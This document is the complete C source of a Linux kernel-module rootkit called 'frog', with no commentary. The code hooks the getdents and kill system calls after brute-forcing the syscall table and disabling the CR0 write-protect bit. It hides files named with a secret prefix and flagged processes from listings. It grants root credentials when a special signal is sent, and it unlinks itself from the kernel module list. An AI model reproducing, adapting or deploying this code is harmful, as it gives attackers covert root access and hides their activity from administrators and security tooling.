#define START_MEM	PAGE_OFFSET
#define END_MEM		ULONG_MAX
#define MAGIC_PREFIX 	"frog_secret"
#define PF_INVISIBLE 	0x10000000
#define MODULE_NAME 	"frog"

#include <asm/uaccess.h>
#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h> 
#include <linux/proc_fs.h>
#include <linux/fdtable.h>


struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

enum {
	SIGINVIS = 31,
	SIGSUPER = 64,
	SIGMODINVIS = 63,
};

unsigned long cr0;
static unsigned long *sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,
	unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,
	struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);
orig_getdents_t orig_getdents;
orig_kill_t orig_kill;


unsigned long* get_syscall_table_bf(void){
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = START_MEM; i < END_MEM; i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

struct task_struct* find_task(pid_t pid){
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int is_invisible(pid_t pid){
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}


asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
unsigned int count){
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;	

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;


	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if ((!proc && 
		(memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0))
		|| (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

void give_root(void){
	struct cred *newcreds;
	newcreds = prepare_creds();

	if (newcreds == NULL)
		return;
	newcreds->uid = newcreds->gid = 0;
	newcreds->euid = newcreds->egid = 0;
	newcreds->suid = newcreds->sgid = 0;
	newcreds->fsuid = newcreds->fsgid = 0;

	commit_creds(newcreds);
}

static inline void tidy(void){
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;

void module_show(void){
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void module_hide(void){
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}

asmlinkage int hacked_kill(pid_t pid, int sig){
	struct task_struct *task;

	switch (sig) {
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case SIGSUPER:
			give_root();
			break;
		case SIGMODINVIS:
			if (module_hidden) module_show();
			else module_hide();
			break;
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void protect_memory(void){
	write_cr0(cr0);
}

static inline void unprotect_memory(void){
	write_cr0(cr0 & ~0x00010000);
}

static int __init frog_init(void){
	sys_call_table = get_syscall_table_bf();
	if (!sys_call_table)
		return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (orig_getdents_t)sys_call_table[__NR_getdents];
	orig_kill = (orig_kill_t)sys_call_table[__NR_kill];

	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	sys_call_table[__NR_kill] = (unsigned long)hacked_kill;
	protect_memory();

	return 0;
}

static void __exit frog_cleanup(void){
	unprotect_memory();
	sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(frog_init);
module_exit(frog_cleanup);

